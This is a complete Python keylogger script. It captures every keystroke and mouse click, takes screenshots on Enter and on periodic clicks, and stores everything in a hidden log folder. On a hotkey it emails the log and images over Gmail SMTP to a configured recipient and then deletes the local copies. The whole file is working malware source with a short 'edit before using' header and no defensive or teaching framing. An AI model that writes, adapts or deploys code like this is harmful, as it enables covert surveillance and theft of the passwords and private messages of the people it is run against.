# author: brownfox2k6
# 22 February 2024

# TODO: Edit this before using
SMTP_HOST = "smtp.gmail.com"
SMTP_PORT = 587
SENDER = "your_email@gmail.com"
SMTP_PASSWORD = "abcdefghijklmnop"  # 16 lowercase letters
RECIPIENT = "recipient@gmail.com"
CLICK_FREQ = 5

# Site-packages
import cv2, dxcam, pynput
# Stdlibs
import datetime, os, shutil, smtplib, ssl, traceback
from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def log(s, color=None) -> None:
  """
  Write s to log file with specified color.
  """
  if color is None:
    log_f.write(s)
  else:
    log_f.write(f"<font color=\"{color}\">{s}</font>")
  log_f.flush()

def get_time() -> str:
  """
  Get local time on computer.
  """
  return datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")

def log_traceback() -> None:
  s = "<br>===== ERROR OCCURRED =====<br>" \
    + traceback.format_exc().replace('\n', "<br>") \
    + "<br>==========<br>"
  log(s, "red")

def get_screenshot() -> None:
  try:
    idx = str(len(os.listdir("./s_manifest"))).rjust(5, '0')
    img = cv2.cvtColor(cam.grab(), cv2.COLOR_BGR2RGB)
    cv2.imwrite(f"./s_manifest/s{idx}.jpg", img)
    log(f"「s{idx}」 ", "blue")
  except:
    log_traceback()


def keyboard_press(key) -> None:
  """
  on_press parameter for keyboard listener.
  """
  if isinstance(key, pynput.keyboard.KeyCode):
    k = key.char
    if key.vk in SPE_CTRL and SPE_CTRL[key.vk] != k \
        and not (isinstance(k, str) and k.isascii()):
      log(f"「{SPE_CTRL[key.vk]}」", "green")
    elif k == '<':
      log("「less」")
    elif k == '>':
      log("「greater」")
    else:
      log(k)
  elif isinstance(key, pynput.keyboard.Key):
    k = key.name
    if k == "f9":
      log(f"<br><br>「Keylogger terminated {get_time()}」 ", "blue")
      send_mail()
      os._exit(0)
    elif k == "enter":
      log(f"<br>「↩ {get_time()}」", "blue")
      get_screenshot()
      return
    elif k == "backspace": k = '⌫'
    elif k == "delete":    k = '⌦'
    elif k == "space":     k = '_'
    elif "shift" in k:     k = '⬆'
    elif k == "tab":       k = '↹'
    log(f"「{k}」", "green")
  else:
    log("「Unhandled key」", "red")


def mouse_click(
    x: int,
    y: int,
    button: pynput.mouse.Button,
    pressed: bool
  ) -> None:
  """
  on_click parameter for mouse listener.
  """
  if not pressed:
    return
  log(f"<br>「🖱️ {x} {y} {button.name} {get_time()}」 ", "blue")
  global click_count
  click_count = (click_count + 1) % CLICK_FREQ
  if click_count == 0:
    get_screenshot()


def send_mail() -> None:
  """
  Send keylogger data through SMTP.
  """
  try:
    print("Initializing and logging in SMTP server")
    server = smtplib.SMTP(host=SMTP_HOST, port=SMTP_PORT)
    server.ehlo()
    server.starttls(context=ssl.create_default_context())
    server.ehlo()
    server.login(user=SENDER, password=SMTP_PASSWORD)

    print("Reading log file")
    log_f.seek(0)
    body = log_f.read()
    body = f'<font size="4" face="Trebuchet MS">{body}</font>'

    print("Initializing message")
    message = MIMEMultipart()
    message["Subject"] = f"Keylogger {get_time()}"
    message["From"] = SENDER
    message["To"] = RECIPIENT
    message.attach(MIMEText(body, "html", "utf-8"))

    print("Attaching screenshots")
    for f in os.listdir("./s_manifest"):
      if not f.endswith(".jpg"):
        continue
      with open(f"./s_manifest/{f}", "rb") as ipath:
        p = MIMEApplication(ipath.read(), _subtype="jpg")
        p.add_header("Content-Disposition", f"attachment; filename={f}")
        message.attach(p)

    print("Sending email")
    server.send_message(message)
    server.quit()
    print("Email sent successfully")

    print("Deleting everything in disk that have just been sent")
    log_f.close()
    shutil.rmtree("./s_manifest", ignore_errors=True)

  except:
    log_traceback()


if __name__ == "__main__":
  SPE_CTRL = {
    192: '`', 49: '1', 50: '2', 51: '3', 52: '4', 53: '5', 54: '6', 55: '7',
    56: '8', 57: '9', 48: '0', 189: '-', 187: '=', 81: 'q', 87: 'w', 69: 'e',
    82: 'r', 84: 't', 89: 'y', 85: 'u', 73: 'i', 79: 'o', 80: 'p', 219: '[',
    221: ']', 220: '\\', 65: 'a', 83: 's', 68: 'd', 70: 'f', 71: 'g', 72: 'h',
    74: 'j', 75: 'k', 76: 'l', 186: ';', 222: "'", 90: 'z', 88: 'x', 67: 'c',
    86: 'v', 66: 'b', 78: 'n', 77: 'm', 188: ',', 190: '.', 191: '/'
  }

  # Initialization
  if not os.path.exists("./s_manifest"):
    os.mkdir("./s_manifest")
  cam = dxcam.create()
  log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
  log(f"<br><br>「Keylogger started {get_time()}」<br>", "blue")
  click_count = 0

  # Create threads
  keyboard = pynput.keyboard.Listener(on_press=keyboard_press)
  mouse = pynput.mouse.Listener(on_click=mouse_click)
  # Start both threads
  keyboard.start()
  mouse.start()
  # Wait until both threads are completely executed
  keyboard.join()
  mouse.join()
